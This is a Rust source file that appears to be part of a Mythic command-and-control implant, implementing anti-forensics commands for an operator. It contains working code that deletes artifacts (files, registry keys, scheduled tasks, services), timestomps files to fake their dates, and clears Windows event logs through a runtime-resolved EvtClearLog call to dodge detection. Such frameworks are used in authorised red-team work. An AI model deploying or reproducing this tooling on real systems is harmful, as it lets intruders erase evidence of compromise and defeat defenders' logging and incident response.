use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;
use std::process::Command;

#[derive(Debug, Deserialize)]
struct CleanupArgs {
    technique: String,
    #[serde(default)]
    target: String,
}

#[derive(Debug, Deserialize)]
struct TimestompArgs {
    path: String,
    #[serde(default)]
    reference: String,
}

#[derive(Debug, Deserialize)]
struct EventlogArgs {
    log: String,
}

pub fn cleanup(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: CleanupArgs = serde_json::from_str(&task.parameters)?;

    match args.technique.as_str() {
        "tokens" => {
            let count = crate::token::clear_all_tokens();
            Ok(mythic_success!(task.id, format!("Cleared {} stored token(s)", count)))
        }
        "files" => {
            if args.target.is_empty() {
                return Ok(mythic_error!(task.id, "File path required for file cleanup"));
            }
            match std::fs::remove_file(&args.target) {
                Ok(_) => Ok(mythic_success!(task.id, format!("Deleted file: {}", args.target))),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to delete file: {}", e))),
            }
        }
        "registry" => cleanup_registry(task, &args.target),
        "scheduled_task" => cleanup_scheduled_task(task, &args.target),
        "service" => cleanup_service(task, &args.target),
        "socks" | "redirect" | "shellcode" => {
            Ok(mythic_success!(task.id, format!("Cleanup signal sent for {}. Use jobkill to terminate active jobs.", args.technique)))
        }
        "all" => {
            let count = crate::token::clear_all_tokens();
            Ok(mythic_success!(task.id, format!("All artifacts cleanup completed. Cleared {} stored token(s). Use jobkill for active socks/redirect jobs.", count)))
        }
        _ => Ok(mythic_error!(task.id, format!("Unknown cleanup technique: {}", args.technique))),
    }
}

#[cfg(target_os = "windows")]
fn cleanup_registry(task: &AgentTask, target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    if target.is_empty() {
        return Ok(mythic_error!(task.id, "Registry key path required"));
    }

    let output = Command::new("reg")
        .args(&["delete", target, "/f"])
        .output()?;

    if output.status.success() {
        Ok(mythic_success!(task.id, format!("Deleted registry key: {}", target)))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Ok(mythic_error!(task.id, format!("Failed to delete registry key: {}", stderr)))
    }
}

#[cfg(not(target_os = "windows"))]
fn cleanup_registry(task: &AgentTask, _target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "Registry cleanup is Windows-only"))
}

#[cfg(target_os = "windows")]
fn cleanup_scheduled_task(task: &AgentTask, target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    if target.is_empty() {
        return Ok(mythic_error!(task.id, "Task name required"));
    }

    let output = Command::new("schtasks")
        .args(&["/Delete", "/TN", target, "/F"])
        .output()?;

    if output.status.success() {
        Ok(mythic_success!(task.id, format!("Deleted scheduled task: {}", target)))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Ok(mythic_error!(task.id, format!("Failed to delete scheduled task: {}", stderr)))
    }
}

#[cfg(not(target_os = "windows"))]
fn cleanup_scheduled_task(task: &AgentTask, _target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "Scheduled task cleanup is Windows-only"))
}

#[cfg(target_os = "windows")]
fn cleanup_service(task: &AgentTask, target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    if target.is_empty() {
        return Ok(mythic_error!(task.id, "Service name required"));
    }

    let stop_output = Command::new("sc")
        .args(&["stop", target])
        .output()?;

    let delete_output = Command::new("sc")
        .args(&["delete", target])
        .output()?;

    if delete_output.status.success() {
        let stop_msg = if stop_output.status.success() {
            "stopped and "
        } else {
            ""
        };
        Ok(mythic_success!(task.id, format!("Service {}{}", stop_msg, target)))
    } else {
        let stderr = String::from_utf8_lossy(&delete_output.stderr);
        Ok(mythic_error!(task.id, format!("Failed to delete service: {}", stderr)))
    }
}

#[cfg(not(target_os = "windows"))]
fn cleanup_service(task: &AgentTask, _target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "Service cleanup is Windows-only"))
}

pub fn timestomp(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: TimestompArgs = serde_json::from_str(&task.parameters)?;

    if args.path.is_empty() {
        return Ok(mythic_error!(task.id, "Target path required"));
    }

    timestomp_impl(task, &args.path, &args.reference)
}

#[cfg(target_os = "windows")]
fn timestomp_impl(task: &AgentTask, path: &str, reference: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let ps_cmd = if reference.is_empty() {
        format!(
            "$f = Get-Item '{}'; $f.CreationTime = '01/01/2020 00:00:00'; $f.LastWriteTime = '01/01/2020 00:00:00'; $f.LastAccessTime = '01/01/2020 00:00:00'",
            path.replace("'", "''")
        )
    } else {
        format!(
            "$ref = Get-Item '{}'; $f = Get-Item '{}'; $f.CreationTime = $ref.CreationTime; $f.LastWriteTime = $ref.LastWriteTime; $f.LastAccessTime = $ref.LastAccessTime",
            reference.replace("'", "''"),
            path.replace("'", "''")
        )
    };

    let output = Command::new("powershell")
        .args(&["-NoProfile", "-Command", &ps_cmd])
        .output()?;

    if output.status.success() {
        let msg = if reference.is_empty() {
            format!("Timestomped {} to 2020-01-01", path)
        } else {
            format!("Timestomped {} using reference {}", path, reference)
        };
        Ok(mythic_success!(task.id, msg))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Ok(mythic_error!(task.id, format!("Failed to timestomp: {}", stderr)))
    }
}

#[cfg(not(target_os = "windows"))]
fn timestomp_impl(task: &AgentTask, path: &str, reference: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let output = if reference.is_empty() {
        Command::new("touch")
            .args(&["-t", "202001010000.00", path])
            .output()?
    } else {
        Command::new("touch")
            .args(&["-r", reference, path])
            .output()?
    };

    if output.status.success() {
        let msg = if reference.is_empty() {
            format!("Timestomped {} to 2020-01-01", path)
        } else {
            format!("Timestomped {} using reference {}", path, reference)
        };
        Ok(mythic_success!(task.id, msg))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Ok(mythic_error!(task.id, format!("Failed to timestomp: {}", stderr)))
    }
}

pub fn eventlog_clear(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: EventlogArgs = serde_json::from_str(&task.parameters)?;
    eventlog_clear_impl(task, &args.log)
}

#[cfg(target_os = "windows")]
fn eventlog_clear_impl(task: &AgentTask, log: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    use std::ptr;

    if log.is_empty() {
        return Ok(mythic_error!(task.id, "Event log name required"));
    }

    unsafe {
        // Resolve EvtClearLog from wevtapi.dll
        type EvtClearLogFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *const u16,
            *const u16,
            u32,
        ) -> *mut std::ffi::c_void;

        let evt_clear_log = match crate::winapi_resolve::resolve("wevtapi.dll", "EvtClearLog") {
            Some(ptr) => std::mem::transmute::<_, EvtClearLogFn>(ptr),
            None => {
                return Ok(mythic_error!(task.id, "Failed to resolve EvtClearLog"));
            }
        };

        // Convert log name to wide string
        let log_wide: Vec<u16> = log.encode_utf16().chain(std::iter::once(0)).collect();

        // EvtClearLog(Session, ChannelPath, TargetFilePath, Flags)
        // Session = NULL, TargetFilePath = NULL, Flags = 0
        let result = evt_clear_log(
            ptr::null_mut(),
            log_wide.as_ptr(),
            ptr::null(),
            0,
        );

        if result.is_null() {
            // Get last error for more details
            Ok(mythic_error!(task.id, format!("Failed to clear event log: {}", log)))
        } else {
            Ok(mythic_success!(task.id, format!("Cleared event log: {}", log)))
        }
    }
}

#[cfg(not(target_os = "windows"))]
fn eventlog_clear_impl(task: &AgentTask, _log: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "Event log clearing is Windows-only"))
}
